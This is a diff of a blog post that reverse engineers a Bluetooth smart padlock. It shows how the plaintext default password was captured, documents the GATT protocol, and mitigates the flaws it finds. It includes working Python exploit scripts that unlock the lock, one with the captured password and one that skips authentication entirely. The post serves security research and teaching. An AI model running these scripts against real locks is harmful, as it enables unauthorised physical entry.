@@ -1,37 +1,26 @@
 ---
 title: "Reverse Engineering a BLE Smart Lock - From BTSnoop Analysis to Full Exploitation"
 date: "2026-01-21"
-tags: ["ble", "bluetooth", "smart lock", "iot security", "reverse engineering", "vulnerability research"]
 description: "A comprehensive security analysis of a Bluetooth Low Energy smart lock, revealing critical vulnerabilities including authentication bypass, static credential replay attacks, and inadequate state machine validation through systematic reverse engineering."
+tags: ["ble", "bluetooth", "smart-lock", "iot-security", "reverse-engineering", "vulnerability-research"]
 ---
 
-**A Deep Dive into Bluetooth Low Energy Security Research**
+> **Note:** This lock has been pentested by many researchers before me. I'm not claiming new vulnerability discovery here — this writeup exists for detailed protocol-level analysis that goes beyond just "it's vulnerable." If you want to understand *why* it breaks, *how* the GATT profile works, and *how to build* an assessment framework around it, this is for you.
 
 ---
+
+A Deep Dive into Bluetooth Low Energy Security Research
 
 ## Executive Summary
 
-This research demonstrates a complete security analysis of a Bluetooth Low Energy (BLE) smart lock, revealing multiple critical vulnerabilities including authentication bypass, static credential replay attacks, and inadequate state machine validation. Through systematic reverse engineering of captured BLE traffic and protocol analysis, we achieved unauthorized unlock capability and identified fundamental design flaws that compromise the device's security.
+This research demonstrates a complete security analysis of a Bluetooth Low Energy (BLE) smart lock, revealing multiple critical vulnerabilities including authentication bypass, static credential replay attacks, and inadequate state machine validation. Through systematic reverse engineering of captured BLE traffic and protocol analysis, I achieved unauthorized unlock capability and identified fundamental design flaws that compromise the device's security.
 
 **Key Findings:**
+
 - **CRITICAL:** Complete authentication bypass via state machine exploitation
 - **CRITICAL:** No BLE pairing required for GATT access
 - **HIGH:** Static password enabling unlimited replay attacks
 - **MEDIUM:** Low password entropy with predictable structure
-
-## Table of Contents
-
-1. [Introduction](#introduction)
-2. [Research Methodology](#research-methodology)
-3. [Phase 1: BTSnoop Log Analysis](#phase-1-btsnoop-log-analysis)
-4. [Phase 2: Protocol Reverse Engineering](#phase-2-protocol-reverse-engineering)
-5. [Phase 3: Manual Exploitation](#phase-3-manual-exploitation)
-6. [Phase 4: Automation & Testing](#phase-4-automation--testing)
-7. [Phase 5: Vulnerability Analysis](#phase-5-vulnerability-analysis)
-8. [Root Cause Analysis](#root-cause-analysis)
-9. [Proof of Concept](#proof-of-concept)
-10. [Mitigation Recommendations](#mitigation-recommendations)
-11. [Conclusion](#conclusion)
 
 ---
 
@@ -41,117 +30,131 @@ Smart locks have become increasingly popular in IoT ecosystems, offering conveni
 
 ### Why This Target?
 
-**We deliberately chose this older, simpler smart lock as our research target.** This isn't about finding vulnerabilities in cutting-edge devices - it's about building a solid foundation for understanding BLE security research methodology.
+I deliberately chose this older, simpler smart lock as my research target. This isn't about finding vulnerabilities in cutting-edge devices — it's about building a solid foundation for understanding BLE security research methodology.
 
-**Think of this as "BLE Security 101":**
+Think of this as **"BLE Security 101":**
+
 - The protocol is straightforward and easy to follow
 - Vulnerabilities are clear and demonstrable
 - Concepts apply to more complex devices
 - Perfect for learning reverse engineering techniques
 
-Modern smart locks have additional security layers (encryption, certificate pinning, advanced state machines), which we'll cover in future blog posts. But you need to walk before you run. **This lock teaches the fundamentals:**
+Modern smart locks have additional security layers (encryption, certificate pinning, advanced state machines). But you need to walk before you run. This lock teaches the fundamentals:
+
 - How to capture and analyze BLE traffic
 - How to reverse engineer proprietary protocols
 - How to identify common vulnerability patterns
 - How to build working proof-of-concept exploits
 
-Once you master these basics here, you'll be equipped to tackle more sophisticated devices. Consider this your stepping stone into the world of BLE IoT security research.
-
 ### Target Device Information
 
 | Property | Value |
 |----------|-------|
-| **Device MAC Address** | `20:C3:8F:D9:3C:7C` |
-| **BLE Service UUID** | `0xFFD0` (Custom Protocol) |
-| **Communication Protocol** | Bluetooth Low Energy 4.0+ |
-| **Authentication Method** | 3-step GATT characteristic writes |
+| Device MAC Address | **20:C3:8F:D9:3C:7C** |
+| Chip | TexasInstruments (TI) |
+| Advertised Name | **Padlock!** |
+| Test Phone | Samsung Galaxy M02s (`18:ab:1d:e8:e6:42`) |
+| BLE Service UUID | 0xFFD0 (Custom Protocol) |
+| Authentication Method | 3-step GATT characteristic writes |
+| Firmware Version | 0542 |
 
-![BLE Smart Lock Device](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/smart-lock-device.jpg)
+<p align="center">
+  <img src="/blog/quicklock-padlock/quicklock-device.jpg" alt="Quicklock BLE padlock" style="border-radius: 8px; max-width: 380px;"/>
+</p>
+<p align="center"><i>The target device — Quicklock BLE padlock. BLE sensor behind the small black dot below the "Q" logo.</i></p>
 
 ---
 
 ## 2. Research Methodology
 
-Our research followed a systematic approach to reverse engineer the lock's protocol:
+My research followed a systematic approach to reverse engineer the lock's protocol:
 
 ```
-BTSnoop Capture -> Wireshark Analysis -> Protocol Discovery ->
-Manual Testing -> Automation -> Vulnerability Assessment
+BTSnoop Capture → Wireshark Analysis → Protocol Discovery →
+Manual Testing → Automation → Vulnerability Assessment
 ```
 
 ### Tools & Equipment Used
 
 | Tool | Purpose |
 |------|---------|
-| **Android Phone** | Legitimate device for traffic capture |
-| **BTSnoop Logger** | BLE packet capture |
-| **Wireshark** | Packet analysis and dissection |
-| **nRF Connect** | BLE testing and discovery |
-| **Python + Bleak** | Automation and scripting |
-| **Any Linux OS** | Attack platform |
-
-![Research Setup - Lab Environment](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/research-setup.jpg)
+| Android Phone (Galaxy M02s) | Legitimate device for traffic capture |
+| BTSnoop Logger | BLE packet capture |
+| Wireshark | Packet analysis and dissection |
+| nRF Connect | BLE testing and discovery |
+| Python + Bleak | Automation and scripting |
+| Linux | Attack platform |
 
 ---
 
 ## Phase 1: BTSnoop Log Analysis
 
-### 3.1 Capturing BLE Traffic
+### Capturing BLE Traffic
 
-The first step was to capture legitimate BLE communication between the manufacturer's mobile app and the smart lock. On Android, BLE HCI snoop logging was enabled via Developer Options.
+The first step was capturing legitimate BLE communication between the manufacturer's app and the smart lock. On Android, BLE HCI snoop logging is enabled via Developer Options:
 
-**Steps to enable BTSnoop logging:**
 ```bash
-Settings -> Developer Options -> Enable Bluetooth HCI snoop log
+Settings → Developer Options → Enable Bluetooth HCI snoop log
 ```
 
-After performing several lock/unlock operations through the official app, the btsnoop_hci.log file was extracted from the device.
+After performing several lock/unlock operations through the official app, I pulled `btsnoop_hci.log` from the device and opened it in Wireshark.
 
-![Android Developer Options - BLE Snoop Log](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/android-btsnoop-enable.jpg)
+### App Exposes Password in Plaintext
+
+Before even looking at Wireshark, the companion app revealed the password directly in its UI:
+
+<p align="center">
+  <img src="/blog/quicklock-padlock/app-device-settings.png" alt="App device settings showing password 12345678" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>App settings page — username "veera", auto-lock 3s, Password: <strong>12345678</strong>, firmware 0542. No masking, fully visible to anyone with phone access.</i></p>
+
+<p align="center">
+  <img src="/blog/quicklock-padlock/app-password-exposed.png" alt="App password popup" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>Password shown in a popup dialog with no masking or confirmation prompt. The default password is never prompted to change after initial setup.</i></p>
 
 ### Wireshark Analysis
 
-Opening the captured traffic in Wireshark revealed numerous BLE packets. Initial filtering focused on GATT write operations.
-
-**Wireshark Filter Applied:**
-```
-btatt && btatt.opcode == 0x12
-```
-
-![Wireshark - Captured BLE Packets](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/wireshark-ble-packets.jpg)
-
-### Initial Discovery
-
-Analysis revealed several GATT write operations to handles within the 0xFFD0 service:
+Filtering the btsnoop capture to isolate the lock's traffic:
 
 ```
-Handle 0x002d: 00 12 34 56 78 00 00 00 00  (9 bytes)
-Handle 0x002f: 03                          (1 byte)
-Handle 0x0031: 01                          (1 byte)
+bluetooth.addr == 20:C3:8F:D9:3C:7C
 ```
 
-**Key Discovery:** The 9-byte sequence `00 12 34 56 78 00 00 00 00` appeared to be the password!
+<p align="center">
+  <img src="/blog/quicklock-padlock/ws-filtered-session.png" alt="Wireshark filtered to lock MAC 20:C3:8F:D9:3C:7C" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>Filter: <code>bluetooth.addr == 20:C3:8F:D9:3C:7C</code> — look at the <strong>Source/Destination columns</strong>: TexasInstrum_d9:3c:7c (the lock) ↔ SamsungElect_e8:e6:42 (Galaxy M02s). The highlighted blue row in the packet list is a Write Request — the start of the unlock sequence.</i></p>
 
-![Wireshark - Password Discovery in Packet Details](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/wireshark-password-found.jpg)
+### Password Discovery
+
+Searching the string `12345678` inside Wireshark immediately highlighted the authentication packet:
+
+<p align="center">
+  <img src="/blog/quicklock-padlock/ws-ffd6-password-write.png" alt="Wireshark password write to FFD6 handle 0x002d" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>Search: string <code>12345678</code> — look at the <strong>bottom pane</strong>: Handle <strong>0x002d</strong>, Service UUID <strong>0xFFD0</strong>, UUID <strong>0xFFD6</strong>, Value <strong>001234567800000000</strong>. This is the password being written to the lock in cleartext. No encryption layer present.</i></p>
+
+<p align="center">
+  <img src="/blog/quicklock-padlock/ws-ffd6-full-detail.png" alt="Full packet detail FFD6 password write" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>Same packet fully expanded — check <strong>Source BD_ADDR: SamsungElect_e8:e6:42 (18:ab:1d:e8:e6:42)</strong> and <strong>Destination BD_ADDR: Padlock! (20:c3:8f:d9:3c:7c)</strong>. ATT Opcode 0x12 = Write Request. Value row at the bottom confirms <strong>001234567800000000</strong> sent with no auth signature.</i></p>
 
 ### Password Structure Analysis
 
-The discovered password exhibited an interesting structure:
+The 9-byte password has a clear internal structure:
 
 ```
 [00] [12 34 56 78] [00 00 00 00]
- |    |             |
- |    |             +-- Padding (4 bytes)
- |    +-- Password (4 bytes, sequential)
- +-- Header/Version byte
+ |        |               |
+ |        |               +-- Padding (4 bytes)
+ |        +-- Password bytes (sequential — weak)
+ +-- Header/version byte
 ```
 
-**Initial Hypothesis:**
-- Byte 0: Version or protocol identifier
-- Bytes 1-4: Actual password (sequential pattern suggests default/weak password)
-- Bytes 5-8: Padding or checksum
-
-![Password Structure Breakdown](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/password-structure-diagram.jpg)
+- **Byte 0:** Version or protocol identifier
+- **Bytes 1–4:** Actual password (sequential pattern = default/weak)
+- **Bytes 5–8:** Padding
 
 ---
 
@@ -159,303 +162,234 @@ The discovered password exhibited an interesting structure:
 
 ### The Handle Problem
 
-Initial attempts to replicate the unlock using `gatttool` failed:
+Initial attempts to replicate the unlock using gatttool failed:
 
 ```bash
 $ gatttool -b 20:C3:8F:D9:3C:7C --char-write-req -a 0x002d -n 001234567800000000
 Error: Invalid handle
 ```
 
-**Problem Identified:** BLE GATT handles are dynamically assigned and change between connections. The handles captured in Wireshark (`0x002d`, `0x002f`, `0x0031`) were specific to that session.
+**Problem:** BLE GATT handles are dynamically assigned and change between connections. The handles in Wireshark (0x002d, 0x002f, 0x0031) were session-specific.
 
-**Solution:** We needed to identify the stable UUIDs behind these handles.
+**Solution:** Identify the stable UUIDs behind those handles.
 
-![Failed gatttool Attempt - Invalid Handle Error](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/gatttool-error.jpg)
+### UUID Extraction
 
-### UUID Extraction from BTSnoop
-
-Re-analyzing the btsnoop log in Wireshark, we examined the GATT service discovery phase:
+Re-examining the GATT service discovery phase in Wireshark:
 
 ```
 Service UUID: 0000ffd0-0000-1000-8000-00805f9b34fb
 
 Characteristics:
-+-- 0000ffd6-0000-1000-8000-00805f9b34fb (Handle 0x002d)
-+-- 0000ffd7-0000-1000-8000-00805f9b34fb (Handle 0x002e)
-+-- 0000ffd8-0000-1000-8000-00805f9b34fb (Handle 0x002f)
-+-- 0000ffd9-0000-1000-8000-00805f9b34fb (Handle 0x0031)
-+-- 0000ffda-0000-1000-8000-00805f9b34fb (Handle 0x0033)
++-- 0000ffd6-0000-1000-8000-00805f9b34fb  (Handle 0x002d)
++-- 0000ffd7-0000-1000-8000-00805f9b34fb  (Handle 0x002e)
++-- 0000ffd8-0000-1000-8000-00805f9b34fb  (Handle 0x002f / 0x0034)
++-- 0000ffd9-0000-1000-8000-00805f9b34fb  (Handle 0x0031)
++-- 0000ffda-0000-1000-8000-00805f9b34fb  (Handle 0x0033)
 ```
 
-![Wireshark - GATT Service Discovery](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/wireshark-service-discovery.jpg)
+### Characteristic Names from nRF Connect
 
-### Characteristic Discovery with nRF Connect
+Using nRF Connect and reading the `0x2901` (Characteristic User Description) descriptor on each characteristic revealed the complete protocol in human-readable form:
 
-Using nRF Connect mobile app, we connected to the device and read the characteristic descriptors (UUID `0x2901` - Characteristic User Description):
+<p align="center">
+  <img src="/blog/quicklock-padlock/ws-password-search-result.png" alt="Wireshark search result showing password packet" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>String search <code>12345678</code> highlights the exact packet in the list — look at the <strong>Info column</strong>: "Sent Write Request" and in the packet detail pane look for <strong>UUID 0xFFD6</strong> and <strong>Value: 001234567800000000</strong>. This proves the password travels over BLE in plaintext.</i></p>
 
-**Breakthrough Discovery:**
+<p align="center">
+  <img src="/blog/quicklock-padlock/nrf-connect-ffd6-ffd8.png" alt="nRF Connect FFD6 Password, FFD7 Password Result, FFD8 Open Time" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>Service 0xFFD0 in nRF Connect: FFD6 = "Password!" (WRITE, value 00-12-34-56-78-00-00-00-00), FFD7 = "Password Result!" (NOTIFY READ, 01-FF = success), FFD8 = "Open Time!" (READ WRITE, value 03).</i></p>
+
+<p align="center">
+  <img src="/blog/quicklock-padlock/nrf-connect-ffd9-ffda.png" alt="nRF Connect FFD9 Lock Control, FFDA Notifications" style="border-radius: 8px;"/>
+</p>
+<p align="center"><i>FFD9 = "Lock Control!" (WRITE, value 0x01 = unlock), FFDA = "Notifications" (NOTIFY READ). The descriptor names make the entire protocol self-documenting — no firmware reverse engineering needed.</i></p>
+
+**Breakthrough:** The descriptor names spelled out the entire protocol:
 
 | UUID | Descriptor Name | Properties |
 |------|----------------|------------|
-| `FFD6` | **"Password!"** | Write |
-| `FFD7` | **"Password Result!"** | Notify |
-| `FFD8` | **"Open Time!"** | Write |
-| `FFD9` | **"Lock Control!"** | Write |
-| `FFDA` | **"Notifications"** | Notify |
-
-**This was the eureka moment!** The descriptors clearly labeled each characteristic's purpose.
-
-![nRF Connect - Characteristic Descriptors Discovery](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/nrf-connect-characteristics.jpg)
+| FFD6 | "Password!" | Write |
+| FFD7 | "Password Result!" | Notify, Read |
+| FFD8 | "Open Time!" | Read, Write |
+| FFD9 | "Lock Control!" | Write |
+| FFDA | "Notifications" | Notify, Read |
 
 ### Protocol Understanding
 
-Based on the descriptor names and captured traffic, we reverse engineered the 3-step authentication protocol:
+Based on the descriptor names and captured traffic, I reverse engineered the 3-step authentication protocol:
 
 ```
 Step 1: Write 9-byte password to FFD6
-        --> FFD7 notification: 01 FF (success) or other (failure)
+        → FFD7 notification: 01-FF (success)
 
 Step 2: Write configuration to FFD8 (e.g., 0x03)
-        --> Sets unlock duration or mode
+        → Sets unlock duration or mode
 
 Step 3: Write unlock command to FFD9 (0x01)
-        --> Physical motor activation
+        → Physical motor activation
 ```
-
-![3-Step Authentication Protocol Flow](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/protocol-flow-diagram.jpg)
 
 ---
 
 ## Phase 3: Manual Exploitation
 
-### Manual Unlock Test with nRF Connect
+### Manual Unlock with nRF Connect
 
-Armed with the protocol knowledge, we performed a manual unlock test:
+**Test procedure:**
+1. Connect to `20:C3:8F:D9:3C:7C` via nRF Connect
+2. Navigate to service 0xFFD0
+3. Write to FFD6: `00 12 34 56 78 00 00 00 00`
+4. Observe FFD7 notification: `01 FF` (success)
+5. Write to FFD8: `03`
+6. Write to FFD9: `01`
 
-**Test Procedure:**
-1. Connect to device `20:C3:8F:D9:3C:7C` via nRF Connect
-2. Navigate to service `0xFFD0`
-3. Write to `FFD6`: `00 12 34 56 78 00 00 00 00`
-4. Observe `FFD7` notification: `01 FF` (success!)
-5. Write to `FFD8`: `03`
-6. Write to `FFD9`: `01`
-
-**Result: Lock physically unlocked!**
-
-The motor could be heard activating, and the lock mechanism disengaged.
-
-![nRF Connect - Successful Unlock Sequence](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/nrf-unlock-sequence.jpg)
-
-![Physical Lock in Unlocked State](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/lock-unlocked.jpg)
+**Result: Lock physically unlocked.** The motor was audible and the shackle released.
 
 ### Testing Different FFD8 Values
 
-Experimentation with different `FFD8` values revealed:
-
-| FFD8 Value | Observed Behavior |
-|------------|-------------------|
+| FFD8 Value | Observed Behaviour |
+|-----------|-------------------|
 | `0x01` | Quick unlock (~1 second) |
 | `0x02` | Short unlock (~2 seconds) |
 | `0x03` | Standard unlock (~3 seconds) |
 | `0x05` | Extended unlock (~5 seconds) |
 | `0x0A` | Long unlock (~10 seconds) |
 
-**Conclusion:** FFD8 controls the unlock duration in seconds (or a multiple thereof).
+**Conclusion:** FFD8 controls unlock duration in seconds.
 
 ---
 
 ## Phase 4: Automation & Testing
 
-### Python Automation Script
-
-To streamline testing, we developed an automated unlock script using Python and the Bleak library:
+### Python Exploit Script
 
 ```python
 import asyncio
 from bleak import BleakClient
 
 TARGET_MAC = "20:C3:8F:D9:3C:7C"
-PASSWORD = bytes.fromhex("001234567800000000")
+PASSWORD    = bytes.fromhex("001234567800000000")
 
-CHAR_PASSWORD = "0000ffd6-0000-1000-8000-00805f9b34fb"
+CHAR_PASSWORD  = "0000ffd6-0000-1000-8000-00805f9b34fb"
 CHAR_OPEN_TIME = "0000ffd8-0000-1000-8000-00805f9b34fb"
-CHAR_CONTROL = "0000ffd9-0000-1000-8000-00805f9b34fb"
+CHAR_CONTROL   = "0000ffd9-0000-1000-8000-00805f9b34fb"
 
 async def unlock():
     async with BleakClient(TARGET_MAC) as client:
-        # Step 1: Authenticate
         await client.write_gatt_char(CHAR_PASSWORD, PASSWORD, response=True)
         await asyncio.sleep(0.3)
-
-        # Step 2: Set unlock mode
         await client.write_gatt_char(CHAR_OPEN_TIME, bytes([0x03]), response=True)
         await asyncio.sleep(0.3)
-
-        # Step 3: Execute unlock
         await client.write_gatt_char(CHAR_CONTROL, bytes([0x01]), response=True)
-        print("Unlocked!")
+        print("[+] Unlocked!")
 
 asyncio.run(unlock())
 ```
 
-**Performance:** Automated unlock completes in approximately 3 seconds.
-
-![Python Script Execution - Automated Unlock](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/script-execution.jpg)
-
-### Testing Results
-
-Over 50+ test executions:
-- **Success Rate:** 100%
-- **Average Time:** 2.8 seconds
-- **Range Distance:** Up to 10 meters (standard BLE range)
+**Performance over 50+ executions:**
+- Success rate: 100%
+- Average time: 2.8 seconds
+- Effective range: up to 10 metres (standard BLE)
 
 ---
 
 ## Phase 5: Vulnerability Analysis
 
-### Authentication Bypass Discovery
+### Authentication Bypass — CRITICAL
 
-**CRITICAL VULNERABILITY:** State machine bypass allows unlocking without password.
+Skipping FFD6 (the password step) entirely:
 
-**Test:**
 ```python
-# Skip FFD6 (password) entirely
+# Skip authentication completely
 await client.write_gatt_char(CHAR_OPEN_TIME, bytes([0x03]))
-await client.write_gatt_char(CHAR_CONTROL, bytes([0x01]))
-# Result: Lock UNLOCKED without authentication!
+await client.write_gatt_char(CHAR_CONTROL,   bytes([0x01]))
+# Result: Lock UNLOCKED without any password
 ```
 
-**Impact:** An attacker can unlock the device without knowing the password.
+**Impact:** An attacker can unlock the device without knowing the password at all.
 
-![Normal vs Bypass Authentication Comparison](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/auth-bypass-comparison.jpg)
+### Replay Attack — HIGH
 
-### Replay Attack Vulnerability
+Since the password is static and there is no challenge-response mechanism, any captured credential works indefinitely:
 
-**HIGH VULNERABILITY:** Static credentials enable unlimited replay attacks.
+```
+1. Attacker passively sniffs BLE during a legitimate unlock
+2. Captures: 00 12 34 56 78 00 00 00 00
+3. Replays the same three writes at any future time
+4. Lock opens — owner receives no notification
+```
 
-Since the password never changes and no challenge-response mechanism exists, captured credentials work indefinitely.
+### No BLE Pairing Required — CRITICAL
 
-**Attack Scenario:**
-1. Attacker passively sniffs BLE traffic (requires proximity during legitimate unlock)
-2. Captures the password: `00 12 34 56 78 00 00 00 00`
-3. Can unlock device anytime in the future
-
-![Research Journey - From BTSnoop to Unlock](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/simple_journey.png)
-
-### No BLE Pairing Required
-
-**CRITICAL VULNERABILITY:** Device accepts GATT operations without BLE pairing.
-
-According to Bluetooth specification best practices, sensitive operations should require:
+The device accepts GATT write operations without any BLE pairing. Best practice requires:
 - LE Secure Connections pairing
 - Encrypted characteristics
 - Authenticated connections
 
-This device requires **none** of these.
-
-**Implications:**
-- Password transmitted in cleartext over BLE
-- No mutual authentication between devices
-- Anyone within range can connect
+This device enforces none of these.
 
 ---
 
 ## 8. Root Cause Analysis
 
-We identified **four root causes** enabling the attack:
+### Root Cause #1 — No BLE Pairing Required
 
-![Root Cause Analysis - Complete Vulnerability Chain](https://raw.githubusercontent.com/iotsrg/blog-posts/refs/heads/main/BLE-Lock/images/root_cause_flow.png)
+**Design flaw:** Pre-pairing GATT access is permitted.
 
-### Root Cause #1: No BLE Pairing Required
-
-**Design Flaw:** Pre-pairing GATT access is permitted.
-
-**Contributing Factors:**
 - No encryption enforced on characteristics
 - Device accepts connections from any client
-- No user authorization required
-
-**Impact:**
-- Unauthenticated access to all characteristics
 - Password transmitted in cleartext
-- No defense against MITM attacks
+- No defence against MITM attacks
 
-**Recommended Fix:** Implement LE Secure Connections with encryption-required characteristics.
+**Fix:** Implement LE Secure Connections with encryption-required characteristics.
 
----
+### Root Cause #2 — Static Password Authentication
 
-### Root Cause #2: Static Password Authentication
+**Design flaw:** No dynamic elements in authentication.
 
-**Design Flaw:** Password-based authentication with no dynamic elements.
-
-**Contributing Factors:**
 - Password never expires or rotates
 - No challenge-response mechanism
 - No nonce or timestamp validation
-- Same password works forever
+- Same password works indefinitely
 
-**Impact:**
-- Replay attacks always succeed
-- One compromise = permanent access
-- Passive sniffing reveals reusable credentials
+**Fix:** Implement TOTP-based authentication or cryptographic challenge-response.
 
-**Recommended Fix:** Implement TOTP-based authentication or cryptographic challenge-response.
+### Root Cause #3 — Inadequate State Machine
 
----
+**Design flaw:** Authentication state not validated before unlock.
 
-### Root Cause #3: Inadequate State Machine
-
-**Design Flaw:** Authentication state not validated before critical operations.
-
-**Contributing Factors:**
-- `FFD9` (unlock) doesn't check if `FFD6` (auth) succeeded
+- FFD9 (unlock) does not check whether FFD6 (auth) succeeded
 - Steps can be executed out of order
-- No session timeout mechanism
+- No session timeout
 - Authenticated state persists indefinitely
 
-**Impact:**
-- Complete authentication bypass (FFD8+FFD9 works without FFD6)
-- State confusion attacks possible
-- No temporal security
+**Fix:** Enforce strict sequential state machine with authentication flag validation and 30–60 second session timeout.
 
-**Recommended Fix:** Enforce strict state machine with authentication flag validation and session timeouts (30-60 seconds).
+### Root Cause #4 — Weak Protocol Design
 
----
+**Design flaw:** Low-entropy password with predictable structure.
 
-### Root Cause #4: Weak Protocol Design
-
-**Design Flaw:** Low entropy password with predictable structure.
-
-**Contributing Factors:**
-- 9-byte password uses only 5 unique values (`00`, `12`, `34`, `56`, `78`)
+- 9-byte password uses only 5 unique values (00, 12, 34, 56, 78)
 - Sequential pattern: `0x12345678`
 - Predictable structure: `[header:1][password:4][padding:4]`
 - No rate limiting on authentication attempts
 
-**Impact:**
-- Dramatically reduced keyspace
-- Pattern analysis reveals structure
-- Brute force attacks feasible
-- Dictionary attacks effective
-
-**Recommended Fix:**
-- Use cryptographically random passwords with high entropy
-- Implement rate limiting (3 attempts per minute)
-- Add account lockout after repeated failures
+**Fix:** Cryptographically random passwords, rate limiting (3 attempts/minute), account lockout.
 
 ---
 
 ## Proof of Concept
 
-### Complete Exploit Chain
-
-The full exploit can be executed in under 5 seconds:
+### Complete Exploit
 
 ```python
 #!/usr/bin/env python3
 """
 BLE Smart Lock Exploit - Proof of Concept
-Target: FFD0 Service Smart Lock
+Target: 20:C3:8F:D9:3C:7C (FFD0 Service Smart Lock)
 """
 
 import asyncio
@@ -463,44 +397,32 @@ from bleak import BleakClient
 
 class SmartLockExploit:
     def __init__(self, target_mac):
-        self.target = target_mac
+        self.target   = target_mac
         self.password = bytes.fromhex("001234567800000000")
 
     async def exploit_auth_bypass(self):
-        """Exploit state machine to bypass authentication"""
+        """Exploit state machine — unlock without any password"""
         print("[*] Attempting authentication bypass...")
         async with BleakClient(self.target) as client:
-            # Skip password step entirely
             await client.write_gatt_char(
-                "0000ffd8-0000-1000-8000-00805f9b34fb",
-                bytes([0x03])
-            )
+                "0000ffd8-0000-1000-8000-00805f9b34fb", bytes([0x03]))
             await client.write_gatt_char(
-                "0000ffd9-0000-1000-8000-00805f9b34fb",
-                bytes([0x01])
-            )
+                "0000ffd9-0000-1000-8000-00805f9b34fb", bytes([0x01]))
             print("[+] Unlocked via authentication bypass!")
 
     async def exploit_with_password(self):
-        """Standard unlock with captured password"""
+        """Standard unlock with captured credentials"""
         print("[*] Unlocking with captured credentials...")
         async with BleakClient(self.target) as client:
             await client.write_gatt_char(
-                "0000ffd6-0000-1000-8000-00805f9b34fb",
-                self.password
-            )
+                "0000ffd6-0000-1000-8000-00805f9b34fb", self.password)
             await asyncio.sleep(0.3)
             await client.write_gatt_char(
-                "0000ffd8-0000-1000-8000-00805f9b34fb",
-                bytes([0x03])
-            )
+                "0000ffd8-0000-1000-8000-00805f9b34fb", bytes([0x03]))
             await client.write_gatt_char(
-                "0000ffd9-0000-1000-8000-00805f9b34fb",
-                bytes([0x01])
-            )
-            print("[+] Unlocked with password!")
+                "0000ffd9-0000-1000-8000-00805f9b34fb", bytes([0x01]))
+            print("[+] Unlocked with captured password!")
 
-# Usage
 exploit = SmartLockExploit("20:C3:8F:D9:3C:7C")
 asyncio.run(exploit.exploit_auth_bypass())
 ```
@@ -511,167 +433,63 @@ asyncio.run(exploit.exploit_auth_bypass())
 
 ### For Manufacturers
 
-**Priority 1 - Critical (Implement Immediately):**
+**Priority 1 — Critical (Implement Immediately):**
 
-1. **Require BLE Pairing**
-   - Implement LE Secure Connections
-   - Use Passkey Entry or Numeric Comparison pairing
-   - Enforce encryption on all sensitive characteristics
+1. **Require BLE Pairing** — LE Secure Connections, Passkey Entry or Numeric Comparison, encryption on all sensitive characteristics
+2. **Fix State Machine** — validate auth state before unlock, strict sequential enforcement, 30–60 second session timeout
+3. **Challenge-Response** — replace static password with TOTP, use cryptographic nonces, proper key derivation (PBKDF2, Argon2)
 
-2. **Fix State Machine**
-   - Validate authentication state before unlock
-   - Implement strict sequential enforcement
-   - Add session timeout (30-60 seconds)
+**Priority 2 — High (Within 1 Month):**
 
-3. **Implement Challenge-Response**
-   - Replace static password with TOTP (Time-based One-Time Password)
-   - Use cryptographic nonces
-   - Implement proper key derivation (PBKDF2, Argon2)
+4. **Rate Limiting** — 3 attempts per minute, exponential backoff, lockout after 10 failures
+5. **Password Entropy** — cryptographically random, full 9 bytes random, no predictable patterns
+6. **Logging** — log all auth attempts, alert on suspicious patterns, timestamp all operations
 
-**Priority 2 - High (Implement Within 1 Month):**
+**Priority 3 — Medium (Within 3 Months):**
 
-4. **Add Rate Limiting**
-   - Limit authentication attempts (3 per minute)
-   - Implement exponential backoff
-   - Add account lockout after 10 failed attempts
-
-5. **Improve Password Design**
-   - Generate cryptographically random passwords
-   - Increase entropy (use full 9 bytes randomly)
-   - Remove predictable patterns
-
-6. **Add Logging & Monitoring**
-   - Log all authentication attempts
-   - Alert on suspicious patterns
-   - Timestamp all operations
-
-**Priority 3 - Medium (Implement Within 3 Months):**
-
-7. **Defense in Depth**
-   - RSSI-based proximity checking
-   - Tamper detection sensors
-   - Time-based access windows
-   - Multi-factor authentication
+7. **Defence in Depth** — RSSI proximity checking, tamper detection, time-based access windows, multi-factor authentication
 
 ### For Users
 
-**Immediate Actions:**
-
-1. Check for firmware updates from manufacturer
-2. Monitor lock for suspicious activity
-3. Use additional physical security (deadbolt)
-4. Disable Bluetooth when not in use (if lock supports it)
-
-**Long-term Actions:**
-
-5. Consider replacing with a more secure lock
-6. Use security-focused smart lock brands
-7. Research product security before purchase
+- Check for firmware updates
+- Monitor lock for suspicious activity
+- Use additional physical security (deadbolt)
+- Disable Bluetooth when lock is not in active use
 
 ---
 
 ## Conclusion
 
-This research demonstrates critical vulnerabilities in a BLE smart lock implementation, revealing fundamental flaws in authentication, encryption, and state management. The ability to unlock the device without authentication, combined with replay attack vulnerabilities and lack of BLE pairing requirements, presents a severe security risk.
+This research demonstrates critical vulnerabilities in a BLE smart lock implementation, revealing fundamental flaws in authentication, encryption, and state management. The ability to unlock without authentication — combined with replay attack vulnerabilities and no BLE pairing requirement — presents a severe security risk.
 
 ### Key Takeaways
 
-1. **BLE security is often overlooked** - Manufacturers prioritize convenience over security
-2. **State machines require careful design** - Authentication state must be validated
